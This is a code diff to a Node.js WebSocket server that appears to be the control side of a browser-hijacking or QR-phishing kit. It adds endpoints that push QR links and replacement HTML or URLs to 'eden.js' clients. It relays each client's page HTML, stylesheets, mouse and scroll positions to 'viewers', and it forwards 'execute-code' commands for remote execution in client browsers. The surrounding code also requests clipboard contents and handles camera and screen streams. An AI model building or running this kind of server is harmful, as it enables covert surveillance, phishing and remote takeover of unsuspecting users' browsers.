@@ -175,6 +175,74 @@ app.use((req, res, next) => {
 // Serve static files from the current directory
 app.use(express.static(__dirname));
 
+// Store QR link and client tracking data
+let currentQrLink = null;
+let clientTrackingData = new Map(); // clientId -> {html, stylesheets, mousePosition, scrollPosition}
+
+// QR update endpoint (called by Python listener)
+app.post('/api/qr-update', (req, res) => {
+    const { link, timestamp } = req.body;
+    console.log('QR update received:', link);
+    if (link) {
+        currentQrLink = link;
+        // Broadcast to all WebSocket clients (both viewers and server.html)
+        const qrUpdateMessage = JSON.stringify({
+            type: 'qr-link-update',
+            link: link,
+            timestamp: timestamp
+        });
+        
+        clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                try {
+                    client.send(qrUpdateMessage);
+                    console.log('QR update sent to client');
+                } catch (e) {
+                    console.error('Error sending QR update to client:', e);
+                }
+            }
+        });
+    }
+    res.json({ success: true });
+});
+
+// Get current QR link endpoint
+app.get('/api/current-qr', (req, res) => {
+    res.json({ link: currentQrLink });
+});
+
+// Fallback endpoint (called by startup.py when keyword status is RED)
+app.post('/api/fallback', (req, res) => {
+    const { type, html, url } = req.body;
+    
+    if (!type) {
+        return res.status(400).json({ success: false, error: 'Missing type' });
+    }
+    
+    // Broadcast fallback message to all connected clients (eden.js)
+    const fallbackMessage = JSON.stringify({
+        type: type,
+        html: html || null,
+        url: url || null
+    });
+    
+    let sentCount = 0;
+    clients.forEach(client => {
+        // Only send to client role (eden.js), not viewers or server.html
+        if (client.readyState === WebSocket.OPEN && client.role === 'client') {
+            try {
+                client.send(fallbackMessage);
+                sentCount++;
+            } catch (e) {
+                console.error('Error sending fallback to client:', e);
+            }
+        }
+    });
+    
+    console.log(`Fallback ${type} sent to ${sentCount} client(s)`);
+    res.json({ success: true, sentTo: sentCount });
+});
+
 // WebSocket server
 const wss = new WebSocket.Server({ server });
 
@@ -186,6 +254,8 @@ wss.on('connection', function connection(ws) {
     console.log('✅ New client connected');
     clients.push(ws);
     messageQueue.set(ws, { camera: [], screen: [], other: [] });
+    ws.clientId = null;
+    ws.role = null; // 'client' or 'viewer'
 
     // Send connection confirmation
     ws.send(JSON.stringify({
@@ -195,6 +265,7 @@ wss.on('connection', function connection(ws) {
     }));
     ws.send(JSON.stringify({ type: 'request-clipboard' }));
     ws.on('message', function incoming(message) {
+        ws.lastMessage = message.toString();
         const messageStr = message.toString();
         console.log('📨 Message received:', messageStr.slice(0, 50));
 
@@ -218,17 +289,155 @@ wss.on('connection', function connection(ws) {
                 return; // Skip other processing for auth messages
             }
             
-            // Handle tracking-related messages
-            if (parsed && parsed.type && ['tracking-control', 'request-content'].includes(parsed.type)) {
-                console.log('Processing tracking message:', parsed.type);
-                // Check if there's a specific target client
-                if (parsed.targetClientId) {
+            // Handle hello message to identify role
+            if (parsed && parsed.type === 'hello') {
+                ws.role = parsed.role;
+                if (parsed.role === 'client') {
+                    ws.clientId = parsed.clientId || `client_${Date.now()}`;
+                }
+                return;
+            }
+            
+            // Handle HTML content and tracking from client
+            if (parsed && parsed.type === 'html-content' && (parsed.role === 'client' || !parsed.role)) {
+                // Store HTML content for this client
+                const clientId = parsed.clientId || ws.clientId;
+                if (clientId) {
+                    if (!clientTrackingData.has(clientId)) {
+                        clientTrackingData.set(clientId, {});
+                    }
+                    const data = clientTrackingData.get(clientId);
+                    data.html = parsed.html || parsed.content;
+                    data.timestamp = parsed.timestamp;
+                    
+                    console.log('Forwarding HTML content from client:', clientId);
+                    
+                    // Forward to all viewers and server.html (all WebSocket clients except the sender)
+                    const forwardMessage = JSON.stringify({
+                        type: 'html-content',
+                        clientId: clientId,
+                        html: parsed.html || parsed.content,
+                        content: parsed.html || parsed.content,
+                        timestamp: parsed.timestamp
+                    });
+                    
                     clients.forEach(client => {
                         if (client !== ws && client.readyState === WebSocket.OPEN) {
-                            client.send(messageStr);
+                            // Send to all clients (viewers and server.html)
+                            try {
+                                client.send(forwardMessage);
+                                console.log('Sent HTML to client');
+                            } catch (e) {
+                                console.error('Error sending HTML to client:', e);
+                            }
                         }
                     });
                 }
+                return;
+            }
+            
+            // Handle stylesheets from client
+            if (parsed && parsed.type === 'stylesheets' && (parsed.role === 'client' || !parsed.role)) {
+                const clientId = parsed.clientId || ws.clientId;
+                if (clientId) {
+                    if (!clientTrackingData.has(clientId)) {
+                        clientTrackingData.set(clientId, {});
+                    }
+                    const data = clientTrackingData.get(clientId);
+                    data.stylesheets = parsed.stylesheets || parsed.styleSheets;
+                    
+                    // Forward to viewers
+                    clients.forEach(client => {
+                        if (client !== ws && client.readyState === WebSocket.OPEN) {
+                            if (client.role === 'viewer' || !client.role) {
+                                const forwardMessage = JSON.stringify({
+                                    ...parsed,
+                                    clientId: clientId
+                                });
+                                client.send(forwardMessage);
+                            }
+                        }
+                    });
+                }
+                return;
+            }
+            
+            // Handle mouse position from client
+            if (parsed && parsed.type === 'mouse-position' && (parsed.role === 'client' || !parsed.role)) {
+                const clientId = parsed.clientId || ws.clientId;
+                if (clientId) {
+                    if (!clientTrackingData.has(clientId)) {
+                        clientTrackingData.set(clientId, {});
+                    }
+                    const data = clientTrackingData.get(clientId);
+                    data.mousePosition = { x: parsed.x, y: parsed.y, clientId: clientId };
+                    
+                    // Forward to viewers
+                    clients.forEach(client => {
+                        if (client !== ws && client.readyState === WebSocket.OPEN) {
+                            if (client.role === 'viewer' || !client.role) {
+                                const forwardMessage = JSON.stringify({
+                                    ...parsed,
+                                    clientId: clientId
+                                });
+                                client.send(forwardMessage);
+                            }
+                        }
+                    });
+                }
+                return;
+            }
+            
+            // Handle scroll position from client
+            if (parsed && parsed.type === 'scroll-position' && (parsed.role === 'client' || !parsed.role)) {
+                const clientId = parsed.clientId || ws.clientId;
+                if (clientId) {
+                    if (!clientTrackingData.has(clientId)) {
+                        clientTrackingData.set(clientId, {});
+                    }
+                    const data = clientTrackingData.get(clientId);
+                    data.scrollPosition = { scrollX: parsed.scrollX, scrollY: parsed.scrollY };
+                    
+                    // Forward to viewers
+                    clients.forEach(client => {
+                        if (client !== ws && client.readyState === WebSocket.OPEN) {
+                            if (client.role === 'viewer' || !client.role) {
+                                const forwardMessage = JSON.stringify({
+                                    ...parsed,
+                                    clientId: clientId
+                                });
+                                client.send(forwardMessage);
+                            }
+                        }
+                    });
+                }
+                return;
+            }
+            
+            // Handle execute-code from viewer to client
+            if (parsed && parsed.type === 'execute-code') {
+                // Forward to target client
+                clients.forEach(client => {
+                    if (client !== ws && client.readyState === WebSocket.OPEN && 
+                        client.role === 'client' && 
+                        (parsed.targetClientId ? client.clientId === parsed.targetClientId : true)) {
+                        client.send(messageStr);
+                    }
+                });
+                return;
+            }
+            
+            // Handle tracking-related messages
+            if (parsed && parsed.type && ['tracking-control', 'request-content'].includes(parsed.type)) {
+                console.log('Processing tracking message:', parsed.type);
+                // Forward to target client
+                clients.forEach(client => {
+                    if (client !== ws && client.readyState === WebSocket.OPEN && 
+                        client.role === 'client' &&
+                        (parsed.targetClientId ? client.clientId === parsed.targetClientId : true)) {
+                        client.send(messageStr);
+                    }
+                });
                 return; // Skip regular queue for these messages
             }
             
@@ -308,6 +517,9 @@ wss.on('connection', function connection(ws) {
     ws.on('close', () => {
         console.log('❌ Client disconnected');
         messageQueue.delete(ws);
+        if (ws.clientId) {
+            clientTrackingData.delete(ws.clientId);
+        }
         clients = clients.filter(c => c !== ws);
     });
 });
